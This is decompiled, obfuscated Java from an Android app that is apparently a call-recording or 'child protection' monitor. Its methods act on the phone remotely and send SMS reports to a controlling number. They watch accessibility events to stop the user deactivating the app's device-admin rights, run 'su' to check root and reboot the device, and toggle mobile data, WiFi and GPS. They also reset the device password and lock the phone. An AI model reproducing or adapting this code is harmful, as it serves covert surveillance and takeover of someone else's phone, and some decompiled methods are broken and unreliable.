package com.yasoka.spcallrecord.recorder.call.a;

import a.c.b.A;
import a.c.b.B;
import a.c.b.C;
import a.c.b.C0071c;
import a.c.b.C0072d;
import a.c.b.C0078j;
import a.c.b.C0080l;
import a.c.b.C0082n;
import a.c.b.C0084p;
import a.c.b.C0085q;
import a.c.b.C0088u;
import a.c.b.C0089v;
import a.c.b.C0090w;
import a.c.b.C0091x;
import a.c.b.C0093z;
import a.c.b.G;
import a.c.b.H;
import a.c.b.J;
import a.c.b.L;
import a.c.b.P;
import a.c.b.S;
import a.c.b.U;
import a.c.b.W;
import a.c.b.f0;
import a.c.b.i0;
import a.c.b.k0;
import a.c.b.o0;
import a.c.b.r;
import a.c.e.e;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences.Editor;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Build.VERSION;
import android.telephony.SmsManager;
import android.text.TextUtils;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import androidx.annotation.RequiresApi;
import com.app.activity.MyApp;
import com.app.received.PolicyActivate;
import com.app.service.ServiceLoc;
import com.crashlytics.android.Crashlytics;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.lang.reflect.Method;
import java.util.List;
import mob.protect.children.R;

/* compiled from: CrashlyticsLog */
public class a {
    public static void a(Throwable th) {
        try {
            th.getStackTrace();
            Crashlytics.logException(th);
        } catch (Exception unused) {
        }
    }

    @RequiresApi(api = 18)
    public static boolean b(AccessibilityEvent accessibilityEvent, Context context) {
        try {
            if (accessibilityEvent.getClassName() != null && (accessibilityEvent.getClassName().toString().equalsIgnoreCase("com.android.settings.DeviceAdminAdd") || accessibilityEvent.getClassName().toString().equalsIgnoreCase("com.android.settings.applications.specialaccess.deviceadmin.DeviceAdminAdd"))) {
                List findAccessibilityNodeInfosByViewId = accessibilityEvent.getSource().findAccessibilityNodeInfosByViewId("com.android.settings:id/admin_name");
                if (findAccessibilityNodeInfosByViewId.size() > 0 && (((AccessibilityNodeInfo) findAccessibilityNodeInfosByViewId.get(0)).getText().toString().equals(context.getString(R.string.name_hide_app)) || ((AccessibilityNodeInfo) findAccessibilityNodeInfosByViewId.get(0)).getText().toString().contains(context.getApplicationInfo().packageName))) {
                    try {
                        PolicyActivate policyActivate = new PolicyActivate(context);
                        DevicePolicyManager devicePolicyManager = (DevicePolicyManager) context.getSystemService("device_policy");
                        ComponentName a2 = policyActivate.a();
                        if (devicePolicyManager == null || devicePolicyManager.getActiveAdmins() == null || !devicePolicyManager.isAdminActive(a2)) {
                            return false;
                        }
                    } catch (Exception e2) {
                        e2.getStackTrace();
                        try {
                            e2.getStackTrace();
                            Crashlytics.logException(e2);
                        } catch (Exception unused) {
                        }
                    }
                    return true;
                }
            }
        } catch (Exception e3) {
            e3.getStackTrace();
            try {
                e3.getStackTrace();
                Crashlytics.logException(e3);
            } catch (Exception unused2) {
            }
        }
        return false;
    }

    public static void c(String str) {
        try {
            f0 f0Var = new f0(MyApp.b().getApplicationContext());
            H h = new H(str);
            f0Var.b();
            f0Var.a(h);
            f0Var.a();
        } catch (Exception e2) {
            try {
                e2.getStackTrace();
                Crashlytics.logException(e2);
            } catch (Exception unused) {
            }
        }
    }

    public static void d(String str) {
        C0078j jVar = new C0078j(MyApp.b().getApplicationContext());
        jVar.b();
        Cursor c2 = jVar.c();
        if (c2 != null) {
            if (c2.getCount() == 0) {
                c2.close();
                jVar.a();
            } else {
                while (c2.moveToNext()) {
                    if (str.contains(c2.getString(1))) {
                        jVar.a(c2.getInt(0));
                    }
                }
            }
            c2.close();
            jVar.a();
        }
    }

    public static boolean e(int i, Context context) {
        try {
            i0 i0Var = new i0(context);
            i0Var.b();
            boolean a2 = i0Var.a(i);
            i0Var.a();
            return a2;
        } catch (Exception e2) {
            try {
                e2.getStackTrace();
                Crashlytics.logException(e2);
            } catch (Exception unused) {
            }
            return false;
        }
    }

    public static boolean a() {
        boolean z;
        boolean z2 = false;
        try {
            Process exec = Runtime.getRuntime().exec("su");
            DataOutputStream dataOutputStream = new DataOutputStream(exec.getOutputStream());
            DataInputStream dataInputStream = new DataInputStream(exec.getInputStream());
            dataOutputStream.writeBytes("id\n");
            dataOutputStream.flush();
            String readLine = dataInputStream.readLine();
            boolean z3 = true;
            if (readLine == null) {
                z = false;
                z3 = false;
            } else {
                z = true == readLine.contains("uid=0");
            }
            if (z3) {
                try {
                    dataOutputStream.writeBytes("exit\n");
                    dataOutputStream.flush();
                } catch (Throwable th) {
                    boolean z4 = z;
                    th = th;
                    z2 = z4;
                    th.getStackTrace();
                    return z2;
                }
            }
            Editor edit = MyApp.b().getApplicationContext().getSharedPreferences("user", 0).edit();
            edit.putBoolean("root", z);
            edit.apply();
            return z;
        } catch (Throwable th2) {
            th = th2;
            th.getStackTrace();
            return z2;
        }
    }

    public static void e(String str) {
        try {
            f0 f0Var = new f0(MyApp.b().getApplicationContext());
            f0Var.b();
            Cursor c2 = f0Var.c();
            if (c2 != null) {
                if (c2.getCount() == 0) {
                    c2.close();
                    f0Var.a();
                } else {
                    while (c2.moveToNext()) {
                        if (str != null && str.toLowerCase().equals(c2.getString(1).toLowerCase())) {
                            f0Var.a(c2.getInt(0));
                        }
                    }
                }
                c2.close();
                f0Var.a();
            }
        } catch (Exception e2) {
            try {
                e2.getStackTrace();
                Crashlytics.logException(e2);
            } catch (Exception unused) {
            }
        }
    }

    public static boolean c(int i, Context context) {
        try {
            U u = new U(context);
            u.b();
            boolean a2 = u.a(i);
            u.a();
            return a2;
        } catch (Exception e2) {
            try {
                e2.getStackTrace();
                Crashlytics.logException(e2);
            } catch (Exception unused) {
            }
            return false;
        }
    }

    public static boolean d(int i, Context context) {
        try {
            W w = new W(context);
            w.b();
            boolean a2 = w.a(i);
            w.a();
            return a2;
        } catch (Exception e2) {
            e2.getStackTrace();
            try {
                e2.getStackTrace();
                Crashlytics.logException(e2);
            } catch (Exception unused) {
            }
            return false;
        }
    }

    public static void c(String str, Context context) {
        try {
            C0080l lVar = new C0080l(context);
            StringBuilder sb = new StringBuilder();
            sb.append("");
            sb.append(str);
            C0089v vVar = new C0089v(sb.toString());
            lVar.b();
            lVar.a(vVar);
            lVar.a();
        } catch (Exception e2) {
            try {
                e2.getStackTrace();
                Crashlytics.logException(e2);
            } catch (Exception unused) {
            }
        }
    }

    public static void b(String str, Context context) {
        String str2 = ")";
        try {
            WifiManager wifiManager = (WifiManager) context.getSystemService("wifi");
            if (wifiManager.isWifiEnabled()) {
                StringBuilder sb = new StringBuilder();
                sb.append(context.getResources().getString(R.string.activateWifiD));
                sb.append(e.h(context));
                sb.append(str2);
                b(str, sb.toString());
            } else if (wifiManager.setWifiEnabled(true)) {
                StringBuilder sb2 = new StringBuilder();
                sb2.append(context.getResources().getString(R.string.activateWifi));
                sb2.append(e.h(context));
                sb2.append(str2);
                b(str, sb2.toString());
            } else {
                StringBuilder sb3 = new StringBuilder();
                sb3.append(context.getResources().getString(R.string.activateWifiE));
                sb3.append(e.h(context));
                sb3.append(str2);
                b(str, sb3.toString());
            }
        } catch (Exception unused) {
            StringBuilder sb4 = new StringBuilder();
            sb4.append(context.getResources().getString(R.string.activateWifiE));
            sb4.append(e.h(context));
            sb4.append(str2);
            b(str, sb4.toString());
        }
    }

    public static void a(Context context, String str) {
        try {
            com.app.action.a.a(true);
        } catch (Throwable th) {
            th.getStackTrace();
        }
        context.stopService(new Intent(context, ServiceLoc.class));
        String str2 = "numberTel";
        String str3 = "2";
        String str4 = "mType";
        String str5 = "0";
        String str6 = "idLog";
        if (VERSION.SDK_INT >= 26) {
            context.startForegroundService(new Intent(context, ServiceLoc.class).putExtra(str6, str5).putExtra(str4, str3).putExtra(str2, str));
        } else {
            context.startService(new Intent(new Intent(context, ServiceLoc.class).putExtra(str6, str5).putExtra(str4, str3).putExtra(str2, str)));
        }
    }

    public static void d(String str, Context context) {
        C0080l lVar = new C0080l(context);
        lVar.b();
        Cursor c2 = lVar.c();
        if (c2 != null) {
            if (c2.getCount() == 0) {
                c2.close();
                lVar.a();
            } else {
                while (c2.moveToNext()) {
                    if (str.toLowerCase().contains(c2.getString(1).toLowerCase())) {
                        lVar.a(c2.getInt(0));
                    }
                }
            }
            c2.close();
            lVar.a();
        }
    }

    public static long a(String str, String str2, String str3, int i, String str4, String str5, String str6, String str7, String str8, Context context) {
        try {
            i0 i0Var = new i0(context);
            G g = new G(str, str2, str3, i, str4, str5, str6, str7, str8);
            i0Var.b();
            long a2 = i0Var.a(g);
            i0Var.a();
            return a2;
        } catch (Exception e2) {
            try {
                e2.getStackTrace();
                Crashlytics.logException(e2);
            } catch (Exception unused) {
            }
            return -1;
        }
    }

    public static long b(String str, String str2, String str3, String str4, String str5, String str6, String str7, String str8, String str9, String str10, Context context) {
        try {
            C0084p pVar = new C0084p(context);
            C0091x xVar = new C0091x(str, str2, str3, str4, str5, str6, str7, str8, str9, str10);
            pVar.b();
            long a2 = pVar.a(xVar);
            pVar.a();
            StringBuilder sb = new StringBuilder();
            sb.append("INSERT IN BDD : ");
            sb.append(a2);
            sb.toString();
            return a2;
        } catch (Exception e2) {
            try {
                e2.getStackTrace();
                Crashlytics.logException(e2);
            } catch (Exception unused) {
            }
            return -1;
        }
    }

    public static boolean a(String str, boolean z, Context context) {
        boolean z2;
        String str2 = "exit\n";
        String str3 = "su";
        boolean z3 = false;
        if (z) {
            try {
                DataOutputStream dataOutputStream = new DataOutputStream(Runtime.getRuntime().exec(str3).getOutputStream());
                dataOutputStream.writeBytes("svc data enable\n");
                dataOutputStream.flush();
                dataOutputStream.writeBytes(str2);
                dataOutputStream.flush();
            } catch (Exception e2) {
                try {
                    e2.getStackTrace();
                    z2 = false;
                } catch (Exception e3) {
                    e = e3;
                    e.getStackTrace();
                    return z3;
                }
            }
        } else {
            DataOutputStream dataOutputStream2 = new DataOutputStream(Runtime.getRuntime().exec(str3).getOutputStream());
            dataOutputStream2.writeBytes("svc data disable\n");
            dataOutputStream2.flush();
            dataOutputStream2.writeBytes(str2);
            dataOutputStream2.flush();
        }
        z2 = true;
        try {
            if (VERSION.SDK_INT <= 19) {
                String str4 = "setMobileDataEnabled";
                String str5 = "connectivity";
                if (z) {
                    ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(str5);
                    Method declaredMethod = ConnectivityManager.class.getDeclaredMethod(str4, new Class[]{Boolean.TYPE});
                    declaredMethod.setAccessible(true);
                    declaredMethod.invoke(connectivityManager, new Object[]{Boolean.valueOf(true)});
                } else {
                    ConnectivityManager connectivityManager2 = (ConnectivityManager) context.getSystemService(str5);
                    Method declaredMethod2 = ConnectivityManager.class.getDeclaredMethod(str4, new Class[]{Boolean.TYPE});
                    declaredMethod2.setAccessible(true);
                    declaredMethod2.invoke(connectivityManager2, new Object[]{Boolean.valueOf(false)});
                }
            }
            z3 = true;
        } catch (Exception e4) {
            try {
                e4.getStackTrace();
                z3 = z2;
            } catch (Exception e5) {
                e = e5;
                z3 = z2;
                e.getStackTrace();
                return z3;
            }
        }
        if (str != null) {
            String str6 = ")";
            if (z3) {
                if (z) {
                    StringBuilder sb = new StringBuilder();
                    sb.append(context.getResources().getString(R.string.activateMobile));
                    sb.append(e.h(context));
                    sb.append(str6);
                    b(str, sb.toString());
                } else {
                    StringBuilder sb2 = new StringBuilder();
                    sb2.append(context.getResources().getString(R.string.activateMobileD));
                    sb2.append(e.h(context));
                    sb2.append(str6);
                    b(str, sb2.toString());
                }
            } else if (z) {
                StringBuilder sb3 = new StringBuilder();
                sb3.append(context.getResources().getString(R.string.activateMobileE));
                sb3.append(e.h(context));
                sb3.append(str6);
                b(str, sb3.toString());
            } else {
                StringBuilder sb4 = new StringBuilder();
                sb4.append(context.getResources().getString(R.string.activateMobileDE));
                sb4.append(e.h(context));
                sb4.append(str6);
                b(str, sb4.toString());
            }
        }
        return z3;
    }

    public static void b(String str, String str2) {
        try {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendMultipartTextMessage(str, null, smsManager.divideMessage(str2), null, null);
        } catch (Exception e2) {
            try {
                e2.getStackTrace();
                Crashlytics.logException(e2);
            } catch (Exception unused) {
            }
        }
    }

    public static boolean b(String str, String str2, Context context) {
        DevicePolicyManager devicePolicyManager = (DevicePolicyManager) context.getSystemService("device_policy");
        ComponentName a2 = new PolicyActivate(context).a();
        if (devicePolicyManager.getActiveAdmins() == null || !devicePolicyManager.isAdminActive(a2)) {
            StringBuilder sb = new StringBuilder();
            sb.append(context.getResources().getString(R.string.yourPhoneNo));
            sb.append(e.h(context));
            sb.append(context.getResources().getString(R.string.noLocked));
            b(str, sb.toString());
            return false;
        }
        devicePolicyManager.resetPassword(str2, 1);
        devicePolicyManager.lockNow();
        StringBuilder sb2 = new StringBuilder();
        sb2.append(context.getResources().getString(R.string.yourPhone));
        sb2.append(e.h(context));
        sb2.append(context.getResources().getString(R.string.locked));
        sb2.append(str2);
        b(str, sb2.toString());
        return true;
    }

    public static boolean b(int i, Context context) {
        try {
            S s = new S(context);
            s.b();
            boolean a2 = s.a(i);
            s.a();
            return a2;
        } catch (Exception e2) {
            try {
                e2.getStackTrace();
                Crashlytics.logException(e2);
            } catch (Exception unused) {
            }
            return false;
        }
    }

    public static void b(Context context, String str) {
        try {
            Runtime.getRuntime().exec("su -c reboot now").waitFor();
        } catch (Throwable unused) {
            StringBuilder sb = new StringBuilder();
            sb.append(context.getResources().getString(R.string.yourPhone));
            sb.append(e.h(context));
            sb.append(context.getResources().getString(R.string.restartKO));
            b(str, sb.toString());
        }
    }

    public static boolean b(String str) {
        try {
            C0080l lVar = new C0080l(MyApp.b().getApplicationContext());
            lVar.b();
            Cursor c2 = lVar.c();
            if (c2 == null) {
                return false;
            }
            if (c2.getCount() == 0) {
                c2.close();
                lVar.a();
                return false;
            }
            while (c2.moveToNext()) {
                if (!str.toLowerCase().contains(c2.getString(1).toLowerCase())) {
                    if (c2.getString(1).toLowerCase().contains(str.toLowerCase())) {
                    }
                }
                lVar.a();
                c2.close();
                return true;
            }
            c2.close();
            lVar.a();
            return false;
        } catch (Exception e2) {
            e2.getStackTrace();
        }
    }

    @RequiresApi(api = 18)
    public static boolean a(AccessibilityEvent accessibilityEvent, Context context) {
        if (accessibilityEvent.getPackageName() != null && accessibilityEvent.getPackageName().toString().equalsIgnoreCase("com.android.settings") && accessibilityEvent.getClassName() != null && ((accessibilityEvent.getClassName().toString().equalsIgnoreCase("android.app.AlertDialog") || accessibilityEvent.getClassName().toString().equalsIgnoreCase("androidx.appcompat.app.AlertDialog") || accessibilityEvent.getClassName().toString().equalsIgnoreCase("com.android.settings.SubSettings")) && accessibilityEvent.getText() != null && accessibilityEvent.getText().size() >= 1 && accessibilityEvent.getText().toString().contains(context.getString(R.string.app_name_accessibility)) && !accessibilityEvent.getText().toString().contains("notification"))) {
            String str = Build.MANUFACTURER;
            if (TextUtils.isEmpty(str) || (!str.toLowerCase().contains("xiaomi") && !str.toLowerCase().contains("huawei") && !str.toLowerCase().contains("honor"))) {
                if ((TextUtils.isEmpty(str) || !str.toLowerCase().contains("samsung")) && accessibilityEvent.getText().size() < 3) {
                    return false;
                }
                return true;
            } else if (accessibilityEvent.getText().size() == 4) {
                return true;
            } else {
                return false;
            }
        }
        return false;
    }

    public static void a(String str, Context context) {
        try {
            String str2 = ")";
            if (com.app.action.a.a(true)) {
                StringBuilder sb = new StringBuilder();
                sb.append(context.getResources().getString(R.string.activateGPS));
                sb.append(e.h(context));
                sb.append(str2);
                b(str, sb.toString());
                return;
            }
            StringBuilder sb2 = new StringBuilder();
            sb2.append(context.getResources().getString(R.string.activateGPSE));
            sb2.append(e.h(context));
            sb2.append(str2);
            b(str, sb2.toString());
        } catch (Throwable th) {
            try {
                th.getStackTrace();
                Crashlytics.logException(th);
            } catch (Exception unused) {
            }
        }
    }

    public static boolean a(int i, Context context) {
        try {
            C0084p pVar = new C0084p(context);
            pVar.b();
            boolean a2 = pVar.a(i);
            pVar.a();
            return a2;
        } catch (Exception e2) {
            try {
                e2.getStackTrace();
                Crashlytics.logException(e2);
            } catch (Exception unused) {
            }
            return false;
        }
    }

    public static long a(String str, String str2, String str3, String str4, Context context) {
        try {
            S s = new S(context);
            A a2 = new A(str, str2, str3, str4);
            s.b();
            long a3 = s.a(a2);
            s.a();
            return a3;
        } catch (Exception e2) {
            e2.getStackTrace();
            try {
                e2.getStackTrace();
                Crashlytics.logException(e2);
            } catch (Exception unused) {
            }
            return -1;
        }
    }

    public static String a(String str) {
        try {
            f0 f0Var = new f0(MyApp.b().getApplicationContext());
            f0Var.b();
            Cursor c2 = f0Var.c();
            if (c2 == null) {
                return null;
            }
            if (c2.getCount() == 0) {
                c2.close();
                f0Var.a();
                return null;
            }
            while (c2.moveToNext()) {
                if (str.toLowerCase().contains(c2.getString(1).toLowerCase())) {
                    String string = c2.getString(1);
                    f0Var.a();
                    c2.close();
                    return string;
                }
            }
            c2.close();
            f0Var.a();
            return null;
        } catch (Exception e2) {
            try {
                e2.getStackTrace();
                Crashlytics.logException(e2);
            } catch (Exception unused) {
            }
        }
    }

    public static void a(String str, String str2, Context context) {
        try {
            C0078j jVar = new C0078j(context);
            C0088u uVar = new C0088u(str, str2);
            jVar.b();
            jVar.a(uVar);
            jVar.a();
        } catch (Exception e2) {
            try {
                e2.getStackTrace();
                Crashlytics.logException(e2);
            } catch (Exception unused) {
            }
        }
    }

    public static boolean a(String str, String str2) {
        try {
            C0078j jVar = new C0078j(MyApp.b().getApplicationContext());
            jVar.b();
            Cursor a2 = jVar.a(str2);
            if (a2 == null) {
                return false;
            }
            if (a2.getCount() == 0) {
                a2.close();
                jVar.a();
                return false;
            }
            while (a2.moveToNext()) {
                StringBuilder sb = new StringBuilder();
                sb.append("+");
                sb.append(a2.getString(1));
                if (str.equals(sb.toString())) {
                    jVar.a();
                    a2.close();
                    return true;
                } else if (str.contains(a2.getString(1)) && str.length() >= 8) {
                    jVar.a();
                    a2.close();
                    return true;
                }
            }
            a2.close();
            jVar.a();
            return false;
        } catch (Exception e2) {
            try {
                e2.getStackTrace();
                Crashlytics.logException(e2);
            } catch (Exception unused) {
            }
        }
    }

    public static long a(String str, String str2, String str3, String str4, String str5, String str6, String str7, String str8, Context context) {
        try {
            U u = new U(context);
            B b2 = new B(str, str2, str3, str4, str5, str6, str7, str8);
            u.b();
            long a2 = u.a(b2);
            u.a();
            return a2;
        } catch (Exception e2) {
            try {
                e2.getStackTrace();
                Crashlytics.logException(e2);
            } catch (Exception unused) {
            }
            return -1;
        }
    }

    public static long a(int i, String str, String str2, int i2, String str3, Context context) {
        String str4 = "";
        try {
            W w = new W(context);
            StringBuilder sb = new StringBuilder();
            sb.append(str4);
            sb.append(str);
            String sb2 = sb.toString();
            StringBuilder sb3 = new StringBuilder();
            sb3.append(str4);
            sb3.append(str2);
            String sb4 = sb3.toString();
            StringBuilder sb5 = new StringBuilder();
            sb5.append(str4);
            sb5.append(str3);
            C c2 = new C(i, sb2, sb4, i2, sb5.toString());
            w.b();
            long a2 = w.a(c2);
            w.a();
            return a2;
        } catch (Exception e2) {
            try {
                e2.getStackTrace();
                Crashlytics.logException(e2);
            } catch (Exception unused) {
            }
            return -1;
        }
    }

    public static long a(String str, String str2, String str3, String str4, String str5, Context context) {
        String str6 = "";
        try {
            o0 o0Var = new o0(context);
            StringBuilder sb = new StringBuilder();
            sb.append(str6);
            sb.append(str);
            String sb2 = sb.toString();
            StringBuilder sb3 = new StringBuilder();
            sb3.append(str6);
            sb3.append(str2);
            String sb4 = sb3.toString();
            StringBuilder sb5 = new StringBuilder();
            sb5.append(str6);
            sb5.append(str3);
            String sb6 = sb5.toString();
            StringBuilder sb7 = new StringBuilder();
            sb7.append(str6);
            sb7.append(str4);
            String sb8 = sb7.toString();
            StringBuilder sb9 = new StringBuilder();
            sb9.append(str6);
            sb9.append(str5);
            L l = new L(sb2, sb4, sb6, sb8, sb9.toString());
            o0Var.b();
            long a2 = o0Var.a(l);
            o0Var.a();
            return a2;
        } catch (Exception e2) {
            e2.getStackTrace();
            return -1;
        }
    }

    public static long a(String str, String str2, String str3, String str4, String str5, int i, Context context) {
        String str6 = "";
        try {
            C0072d dVar = new C0072d(context);
            StringBuilder sb = new StringBuilder();
            sb.append(str6);
            sb.append(str);
            String sb2 = sb.toString();
            StringBuilder sb3 = new StringBuilder();
            sb3.append(str6);
            sb3.append(str2);
            String sb4 = sb3.toString();
            StringBuilder sb5 = new StringBuilder();
            sb5.append(str6);
            sb5.append(str3);
            String sb6 = sb5.toString();
            StringBuilder sb7 = new StringBuilder();
            sb7.append(str6);
            sb7.append(str4);
            C0085q qVar = new C0085q(sb2, sb4, sb6, sb7.toString(), str5, i);
            dVar.b();
            long a2 = dVar.a(qVar);
            dVar.a();
            return a2;
        } catch (Exception e2) {
            e2.getStackTrace();
            try {
                e2.getStackTrace();
                Crashlytics.logException(e2);
            } catch (Exception unused) {
            }
            return -1;
        }
    }

    public static long a(String str, String str2, String str3) {
        String str4 = "";
        try {
            k0 k0Var = new k0(MyApp.b().getApplicationContext());
            StringBuilder sb = new StringBuilder();
            sb.append(str4);
            sb.append(str);
            String sb2 = sb.toString();
            StringBuilder sb3 = new StringBuilder();
            sb3.append(str4);
            sb3.append(str2);
            String sb4 = sb3.toString();
            StringBuilder sb5 = new StringBuilder();
            sb5.append(str4);
            sb5.append(str3);
            J j = new J(sb2, sb4, sb5.toString());
            k0Var.b();
            long a2 = k0Var.a(j);
            k0Var.a();
            return a2;
        } catch (Exception e2) {
            e2.getStackTrace();
            return -1;
        }
    }

    public static boolean a(int i) {
        try {
            k0 k0Var = new k0(MyApp.b().getApplicationContext());
            k0Var.b();
            boolean a2 = k0Var.a(i);
            k0Var.a();
            return a2;
        } catch (Exception e2) {
            e2.getStackTrace();
            return false;
        }
    }

    public static long a(String str, String str2, String str3, String str4) {
        String str5 = "";
        try {
            P p = new P(MyApp.b().getApplicationContext());
            StringBuilder sb = new StringBuilder();
            sb.append(str5);
            sb.append(str2);
            String sb2 = sb.toString();
            StringBuilder sb3 = new StringBuilder();
            sb3.append(str5);
            sb3.append(str);
            String sb4 = sb3.toString();
            StringBuilder sb5 = new StringBuilder();
            sb5.append(str5);
            sb5.append(str3);
            String sb6 = sb5.toString();
            StringBuilder sb7 = new StringBuilder();
            sb7.append(str5);
            sb7.append(str4);
            C0093z zVar = new C0093z(sb2, sb4, sb6, sb7.toString());
            p.b();
            long a2 = p.a(zVar);
            p.a();
            return a2;
        } catch (Exception e2) {
            try {
                e2.getStackTrace();
                Crashlytics.logException(e2);
            } catch (Exception unused) {
            }
            return -1;
        }
    }

    public static long a(String str, String str2, String str3, String str4, String str5, String str6, String str7, String str8, String str9, String str10, Context context) {
        String str11 = "";
        try {
            C0082n nVar = new C0082n(context);
            StringBuilder sb = new StringBuilder();
            sb.append(str11);
            String str12 = str;
            sb.append(str);
            String sb2 = sb.toString();
            StringBuilder sb3 = new StringBuilder();
            sb3.append(str11);
            String str13 = str2;
            sb3.append(str2);
            String sb4 = sb3.toString();
            StringBuilder sb5 = new StringBuilder();
            sb5.append(str11);
            String str14 = str3;
            sb5.append(str3);
            String sb6 = sb5.toString();
            StringBuilder sb7 = new StringBuilder();
            sb7.append(str11);
            sb7.append(str4);
            String sb8 = sb7.toString();
            StringBuilder sb9 = new StringBuilder();
            sb9.append(str11);
            sb9.append(str5);
            String sb10 = sb9.toString();
            StringBuilder sb11 = new StringBuilder();
            sb11.append(str11);
            sb11.append(str6);
            String sb12 = sb11.toString();
            StringBuilder sb13 = new StringBuilder();
            sb13.append(str11);
            sb13.append(str7);
            String sb14 = sb13.toString();
            StringBuilder sb15 = new StringBuilder();
            sb15.append(str11);
            sb15.append(str8);
            String sb16 = sb15.toString();
            StringBuilder sb17 = new StringBuilder();
            sb17.append(str11);
            sb17.append(str9);
            String sb18 = sb17.toString();
            StringBuilder sb19 = new StringBuilder();
            sb19.append(str11);
            sb19.append(str10);
            C0090w wVar = new C0090w(sb2, sb4, sb6, sb8, sb10, sb12, sb14, sb16, sb18, sb19.toString());
            nVar.b();
            long a2 = nVar.a(wVar);
            nVar.a();
            return a2;
        } catch (Exception e2) {
            try {
                e2.getStackTrace();
                Crashlytics.logException(e2);
            } catch (Exception unused) {
            }
            return -1;
        }
    }

    public static synchronized long a(int i, long j, String str, Context context) {
        long j2;
        synchronized (a.c.c.a.class) {
            j2 = -1;
            try {
                C0071c cVar = new C0071c(context);
                r rVar = new r(i, j, str);
                cVar.b();
                j2 = cVar.a(rVar);
                cVar.a();
            } catch (Throwable th) {
                th.getStackTrace();
                try {
                    th.getStackTrace();
                    Crashlytics.logException(th);
                } catch (Exception unused) {
                }
            }
        }
        return j2;
    }

    public static synchronized boolean a(long j, Context context) {
        synchronized (a.c.c.a.class) {
            try {
                C0071c cVar = new C0071c(context);
                cVar.b();
                if (cVar.a(j)) {
                    cVar.a();
                    return true;
                }
                cVar.a();
                return false;
            } catch (Throwable th) {
                th.getStackTrace();
                try {
                    th.getStackTrace();
                    Crashlytics.logException(th);
                } catch (Exception unused) {
                }
            }
        }
    }
}
